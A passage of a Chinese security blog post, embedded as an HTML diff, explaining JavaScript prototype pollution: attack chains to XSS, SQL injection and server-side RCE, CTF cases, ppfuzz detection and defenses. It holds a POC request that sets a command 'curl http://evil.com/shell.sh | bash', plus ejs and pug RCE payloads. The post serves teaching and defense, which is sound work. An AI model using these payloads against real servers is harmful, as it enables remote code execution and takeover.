class="string">&#x27;app&#x27;</span>).<span class="property">innerHTML</span> = userInput;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 攻击者可以注入 &lt;img src=x onerror=alert(1)&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-第二阶段：污染生效-→-SQL-注入"><a href="#3-2-第二阶段：污染生效-→-SQL-注入" class="headerlink" title="3.2 第二阶段：污染生效 → SQL 注入"></a>3.2 第二阶段：污染生效 → SQL 注入</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 场景：ORM 查询构建器从 options 对象读取构建参数</span></span><br><span class="line"><span class="keyword">const</span> queryOptions = &#123;&#125;;</span><br><span class="line"><span class="comment">// 原型被污染：__proto__.escape = false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">buildWhere</span>(<span class="params">conditions, options</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="built_in">escape</span> = options.<span class="property">escape</span> !== <span class="literal">false</span>;  <span class="comment">// 从原型读取到 false</span></span><br><span class="line">    <span class="keyword">let</span> sql = <span class="string">&#x27;SELECT * FROM users WHERE &#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> [col, val] <span class="keyword">of</span> <span class="title class_">Object</span>.<span class="title function_">entries</span>(conditions)) &#123;</span><br><span class="line">        <span class="keyword">const</span> safeVal = <span class="built_in">escape</span> ? <span class="title function_">quote</span>(val) : val;</span><br><span class="line">        sql += <span class="string">`<span class="subst">$&#123;col&#125;</span> = <span class="subst">$&#123;safeVal&#125;</span> AND `</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sql.<span class="title function_">slice</span>(<span class="number">0</span>, -<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 攻击者可以绕过引号转义，注入 UNION SELECT ...</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-3-第三阶段：污染生效-→-服务端-RCE"><a href="#3-3-第三阶段：污染生效-→-服务端-RCE" class="headerlink" title="3.3 第三阶段：污染生效 → 服务端 RCE"></a>3.3 第三阶段：污染生效 → 服务端 RCE</h3><p>这是危害性最高的利用链，常见于 Node.js 服务端应用。以下展示一条完整的 RCE 攻击路径：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ── 脆弱后端代码 ──</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一个存在 merge 操作的路由</span></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/api/config&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> defaults = &#123; <span class="attr">theme</span>: <span class="string">&#x27;light&#x27;</span>, <span class="attr">lang</span>: <span class="string">&#x27;en&#x27;</span> &#125;;</span><br><span class="line">    <span class="title function_">merge</span>(defaults, req.<span class="property">body</span>);           <span class="comment">// 这里发生污染</span></span><br><span class="line">    res.<span class="title function_">json</span>(&#123; <span class="attr">status</span>: <span class="string">&#x27;ok&#x27;</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 另一条路由使用 child_process 执行用户可控的程序名</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/api/report&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> options = &#123;&#125;;</span><br><span class="line">    <span class="comment">// 注意：spawn 的第三个参数 options 也是一个普通对象</span></span><br><span class="line">    <span class="comment">// 如果原型被污染了 __proto__.shell = &#x27;/bin/bash&#x27; 或注入额外环境变量</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更常见的利用点：某些框架根据配置决定运行时行为</span></span><br><span class="line">    <span class="keyword">const</span> proc = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(</span><br><span class="line">        options.<span class="property">cmd</span> || <span class="string">&#x27;uptime&#x27;</span>,         <span class="comment">// 污染点：__proto__.cmd</span></span><br><span class="line">        options</span><br><span class="line">    );</span><br><span class="line">    res.<span class="title function_">send</span>(proc.<span class="title function_">toString</span>());</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p><strong>POC 攻击步骤：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /api/config HTTP/1.1</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;__proto__&quot;: &#123;</span><br><span class="line">        &quot;cmd&quot;: &quot;curl http://evil.com/shell.sh | bash&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 然后触发：</span><br><span class="line">GET /api/report</span><br><span class="line"># 服务端 execSync 执行了恶意命令</span><br></pre></td></tr></table></figure>
+
+<p><strong>另一种经典 RCE 路径 —— 污染 env 变量：</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Node 的 child_process 模块会将 options.env 传递给子进程</span></span><br><span class="line"><span class="comment">// 若通过原型污染注入 NODE_OPTIONS 环境变量，可实现代码执行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> payload = &#123;</span><br><span class="line">    <span class="string">&quot;__proto__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;env&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;NODE_OPTIONS&quot;</span>: <span class="string">&quot;--require=/tmp/malicious.js&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;NODE_OPTIONS&quot;</span>: <span class="string">&quot;--require=/tmp/malicious.js&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-4-利用链全景图"><a href="#3-4-利用链全景图" class="headerlink" title="3.4 利用链全景图"></a>3.4 利用链全景图</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">     JSON.parse 注入恶意键</span><br><span class="line">             │</span><br><span class="line">             ▼</span><br><span class="line">   merge/clone/extend (未过滤 __proto__)</span><br><span class="line">             │</span><br><span class="line">             ▼</span><br><span class="line">      Object.prototype 被污染</span><br><span class="line">             │</span><br><span class="line">  ┌──────────┼──────────┬──────────────┐</span><br><span class="line">  ▼          ▼          ▼              ▼</span><br><span class="line">配置对象   查询对象   模板上下文   运行时选项</span><br><span class="line">  │          │          │              │</span><br><span class="line">  ▼          ▼          ▼              ▼</span><br><span class="line">权限绕过   SQL注入     XSS      child_process RCE</span><br><span class="line">  │          │          │              │</span><br><span class="line">  ▼          ▼          ▼              ▼</span><br><span class="line"> 越权操作   数据库沦陷  用户劫持    服务器沦陷</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="四、自动化检测工具：ppfuzz"><a href="#四、自动化检测工具：ppfuzz" class="headerlink" title="四、自动化检测工具：ppfuzz"></a>四、自动化检测工具：ppfuzz</h2><p><a target="_blank" rel="noopener" href="https://github.com/dwisiswant0/ppfuzz">ppfuzz</a> 是一款专门用于原型链污染模糊测试的工具，它能够自动化识别存在 prototype pollution 的端点。</p>
+<h3 id="4-1-安装与基础用法"><a href="#4-1-安装与基础用法" class="headerlink" title="4.1 安装与基础用法"></a>4.1 安装与基础用法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">go install github.com/dwisiswant0/ppfuzz@latest</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对单个URL进行测试</span></span><br><span class="line">ppfuzz -u <span class="string">&quot;https://target.com/api/merge&quot;</span> -m POST -d <span class="string">&#x27;&#123;&quot;user&quot;:&quot;test&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从文件批量测试</span></span><br><span class="line">ppfuzz -l urls.txt -H <span class="string">&quot;Authorization: Bearer xxx&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-2-检测原理"><a href="#4-2-检测原理" class="headerlink" title="4.2 检测原理"></a>4.2 检测原理</h3><p>ppfuzz 会向目标发送包含 <code>__proto__</code> 载荷的请求，随后通过多种<strong>回显检测技术</strong>判断污染是否成功：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检测策略示例 — 发往目标的载荷</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;user&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__proto__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;ppfuzz_key&quot;</span>: <span class="string">&quot;ppfuzz_value_1337&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ppfuzz 随后发送第二个请求，在响应中查找 ppfuzz_key 是否被反射</span></span><br><span class="line"><span class="comment">// 如果服务端在响应中意外地输出了 ppfuzz_key，则说明污染成功</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-3-自定义检测规则"><a href="#4-3-自定义检测规则" class="headerlink" title="4.3 自定义检测规则"></a>4.3 自定义检测规则</h3><p>ppfuzz 支持自定义模板，用于适配不同的应用场景：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># custom_template.yaml</span></span><br><span class="line"><span class="attr">id:</span> <span class="string">prototype-pollution-detection</span></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">PP</span> <span class="string">Detection</span></span><br><span class="line">  <span class="attr">severity:</span> <span class="string">critical</span></span><br><span class="line"></span><br><span class="line"><span class="attr">requests:</span></span><br><span class="line">    <span class="attr">path:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;/api/merge&quot;</span></span><br><span class="line">    <span class="attr">headers:</span></span><br><span class="line">      <span class="attr">Content-Type:</span> <span class="string">application/json</span></span><br><span class="line">    <span class="attr">body:</span> <span class="string">|</span></span><br><span class="line"><span class="string">      &#123;</span></span><br><span class="line"><span class="string">        &quot;__proto__&quot;: &#123;</span></span><br><span class="line"><span class="string">          &quot;status&quot;: &quot;polluted&quot;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">    <span class="attr">matchers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">word</span></span><br><span class="line">        <span class="attr">words:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">&quot;polluted&quot;</span></span><br><span class="line">        <span class="attr">part:</span> <span class="string">body</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-4-手工检测技法"><a href="#4-4-手工检测技法" class="headerlink" title="4.4 手工检测技法"></a>4.4 手工检测技法</h3><p>在没有工具的情况下，可以采用以下手工方法验证污染：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方法1：发送污染载荷并观察错误堆栈</span></span><br><span class="line">curl -X POST https://target.com/api/config \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;isAdmin&quot;:true&#125;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法2：对比属性描述符（ES5+）</span></span><br><span class="line"><span class="comment"># 如果目标端点有调试日志，可以观察 toString/valueOf 行为异常</span></span><br><span class="line">curl -X POST https://target.com/api/merge \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;toString&quot;:&quot;polluted&quot;&#125;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法3：污染 constructor 链</span></span><br><span class="line">curl -X POST https://target.com/api/extend \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;shell&quot;:&quot;/bin/sh&quot;&#125;&#125;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="五、CTF-经典案例剖析"><a href="#五、CTF-经典案例剖析" class="headerlink" title="五、CTF 经典案例剖析"></a>五、CTF 经典案例剖析</h2><h3 id="5-1-案例一：-HITCON-CTF-Ghost-in-the-Prototype"><a href="#5-1-案例一：-HITCON-CTF-Ghost-in-the-Prototype" class="headerlink" title="5.1 案例一：[HITCON CTF] Ghost in the Prototype"></a>5.1 案例一：[HITCON CTF] Ghost in the Prototype</h3><p><strong>场景：</strong> 一个 Express 博客应用，用户可提交配置合并请求。</p>
+<p><strong>漏洞代码：</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/settings&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> userSettings = &#123;&#125;;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">assign</span>(userSettings, req.<span class="property">body</span>);  <span class="comment">// 直接 assign 不会污染</span></span><br><span class="line">    <span class="comment">// 但后续使用了 lodash &lt; 4.17.11</span></span><br><span class="line">    userSettings = _.<span class="title function_">defaultsDeep</span>(userSettings, defaultSettings);</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">settings</span> = userSettings;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p><strong>利用：</strong> 通过 <code>defaultsDeep</code> 污染 <code>Object.prototype.role = &#39;admin&#39;</code>，后续路由中 <code>req.session.role</code> 从原型读取到 <code>admin</code>，造成权限提升。</p>
+<h3 id="5-2-案例二：原型污染-ejs-模板引擎-RCE"><a href="#5-2-案例二：原型污染-ejs-模板引擎-RCE" class="headerlink" title="5.2 案例二：原型污染 + ejs 模板引擎 RCE"></a>5.2 案例二：原型污染 + ejs 模板引擎 RCE</h3><p>ejs 模板引擎的 <code>renderFile</code> 函数会将 <code>options</code> 合并到内部对象上。如果攻击者能污染 <code>Object.prototype</code>，就可以注入 ejs 的输出函数路径 (<code>outputFunctionName</code>)，实现 RCE：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 污染载荷</span></span><br><span class="line"><span class="keyword">const</span> payload = &#123;</span><br><span class="line">    <span class="string">&quot;__proto__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;outputFunctionName&quot;</span>: <span class="string">&quot;x;process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;);s&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 触发 RCE</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/page&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 当 ejs 渲染时，outputFunctionName 从原型读取</span></span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;page&#x27;</span>, &#123; <span class="attr">title</span>: <span class="string">&#x27;Home&#x27;</span> &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p><strong>原理：</strong> ejs 内部使用 <code>prepended += &#39;var &#39; + opts.outputFunctionName + &#39; = ...&#39;</code> 拼接字符串生成模板函数体，<code>outputFunctionName</code> 被注入后直接拼入了可执行代码。</p>
+<h3 id="5-3-案例三：原型污染-pug-模板引擎-RCE"><a href="#5-3-案例三：原型污染-pug-模板引擎-RCE" class="headerlink" title="5.3 案例三：原型污染 + pug 模板引擎 RCE"></a>5.3 案例三：原型污染 + pug 模板引擎 RCE</h3><p>pug（原 Jade）的 <code>compile</code> 函数同样会接收 options 对象。污染 <code>Object.prototype</code> 中的 <code>compileDebug</code>、<code>self</code> 等字段可以注入恶意代码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 污染原型</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">line</span> = <span class="string">&#x27;global.process.mainModule.require(&quot;child_process&quot;).execSync(&quot;id&quot;)&#x27;</span>;</span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">self</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 触发 pug 编译 → RCE</span></span><br><span class="line"><span class="keyword">const</span> pug = <span class="built_in">require</span>(<span class="string">&#x27;pug&#x27;</span>);</span><br><span class="line">pug.<span class="title function_">compile</span>(<span class="string">&#x27;h1 Hello&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="六、防御方案"><a href="#六、防御方案" class="headerlink" title="六、防御方案"></a>六、防御方案</h2><h3 id="6-1-开发层面"><a href="#6-1-开发层面" class="headerlink" title="6.1 开发层面"></a>6.1 开发层面</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方法1：使用 Object.create(null) 创建无原型对象</span></span><br><span class="line"><span class="keyword">const</span> safe = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line">safe.<span class="property">__proto__</span>  <span class="comment">// undefined — 彻底阻断原型链</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法2：在合并时过滤危险键</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">BLOCKED_KEYS</span> = [<span class="string">&#x27;__proto__&#x27;</span>, <span class="string">&#x27;constructor&#x27;</span>, <span class="string">&#x27;prototype&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">safeMerge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">of</span> <span class="title class_">Object</span>.<span class="title function_">keys</span>(source)) &#123;   <span class="comment">// 注意用 Object.keys 而非 for...in</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable constant_">BLOCKED_KEYS</span>.<span class="title function_">includes</span>(key)) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> source[key] === <span class="string">&#x27;object&#x27;</span> &amp;&amp; source[key] !== <span class="literal">null</span>) &#123;</span><br><span class="line">            target[key] = <span class="title function_">safeMerge</span>(target[key] || &#123;&#125;, source[key]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> target;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法3：冻结 Object.prototype（谨慎使用，副作用大）</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">freeze</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">freeze</span>(<span class="title class_">Object</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-2-运维与架构层面"><a href="#6-2-运维与架构层面" class="headerlink" title="6.2 运维与架构层面"></a>6.2 运维与架构层面</h3><table>
+<thead>
+<tr>
+<th align="left">层级</th>
+<th align="left">措施</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">依赖管理</td>
+<td align="left">定期 <code>npm audit</code>，锁定 lodash&#x2F;hoek 等包的版本</td>
+</tr>
+<tr>
+<td align="left">WAF 规则</td>
+<td align="left">拦截请求体中包含 <code>__proto__</code> &#x2F; <code>constructor.prototype</code> 的 JSON</td>
+</tr>
+<tr>
+<td align="left">代码审计</td>
+<td align="left">对 <code>merge</code>、<code>extend</code>、<code>clone</code>、<code>set</code> 的调用点做专项审查</td>
+</tr>
+<tr>
+<td align="left">运行时检测</td>
+<td align="left">使用 <code>--disallow-code-generation-from-strings</code> 标志启动 Node.js</td>
+</tr>
+<tr>
+<td align="left">Schema 校验</td>
+<td align="left">所有用户输入必须经过 JSON Schema 校验，拒绝未知属性</td>
+</tr>
+</tbody></table>
+<h3 id="6-3-运行时监控"><a href="#6-3-运行时监控" class="headerlink" title="6.3 运行时监控"></a>6.3 运行时监控</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在应用启动时注入原型访问监控（仅用于测试/调试环境）</span></span><br><span class="line"><span class="keyword">const</span> _origSetter = <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__defineSetter__</span>;</span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="title function_">__defineSetter__</span>(<span class="string">&#x27;__proto__&#x27;</span>, <span class="keyword">function</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">trace</span>(<span class="string">&#x27;[ALERT] Attempt to set __proto__&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> _origSetter.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="string">&#x27;__proto__&#x27;</span>, val);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a>七、总结</h2><p>原型链污染是 JavaScript&#x2F;Node.js 生态中一类根源于语言特性的漏洞，它的威力来自于<strong>一次污染、全局生效</strong>的覆盖能力。虽然现代框架和运行时已经做了很多防御（如 <code>Object.create(null)</code> 的推广、<code>lodash</code> 的修复），但在复杂的依赖树中，仍然可能有某个冷门包的 <code>merge</code> 在静默地打开一扇后门。</p>
+<p>对于渗透测试工程师来说，原型链污染的挖掘需要：</p>
+<ol>
+<li><strong>识别数据流中的 merge&#x2F;extend&#x2F;set 操作</strong>；</li>
+<li><strong>追踪污染属性在后续业务逻辑中的利用点</strong>；</li>
+<li><strong>构建从污染到具体危害的完整利用链</strong>。</li>
+</ol>
+<p>防御方则应当采取<strong>纵深防御</strong>策略：开发层过滤危险键 → Schema 层拒绝未知属性 → 运行时冻结原型 → WAF 层拦截载荷。</p>
+<hr>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/prototype-pollution">PortSwigger - Prototype Pollution</a></li>
+<li><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2019-10744">CVE-2019-10744: lodash defaultsDeep 原型链污染</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/dwisiswant0/ppfuzz">ppfuzz - Prototype Pollution Fuzzer</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/BlackFan/client-side-prototype-pollution">BlackFan - Client Side Prototype Pollution</a></li>
+<li><a target="_blank" rel="noopener" href="https://ctftime.org/event/669/tasks/">HITCON CTF 相关 Writeups</a></li>
+<li><a target="_blank" rel="noopener" href="https://nodejs.org/en/docs/guides/security/">Node.js Security Best Practices</a></li>
+</ul>
+<hr>
+<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>本文所述技术仅用于安全研究、授权渗透测试和CTF竞赛等合法场景。未经授权对计算机系统进行攻击、入侵或利用原型链污染漏洞获取未授权访问均属违法行为，可能构成《刑法》第285条（非法侵入计算机信息系统罪）、第286条（破坏计算机信息系统罪）等刑事犯罪。作者不对任何因滥用本文技术而导致的直接或间接损失承担责任。请遵守当地法律法规，在获得明确书面授权后方可进行安全测试。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/Authentication-default-credentials/" rel="prev" title="认证安全：弱口令与默认口令">
+                  <i class="fa fa-angle-left"></i> 认证安全：弱口令与默认口令
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/JWT-attacks/" rel="next" title="JWT安全深度解析">
+                  JWT安全深度解析 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
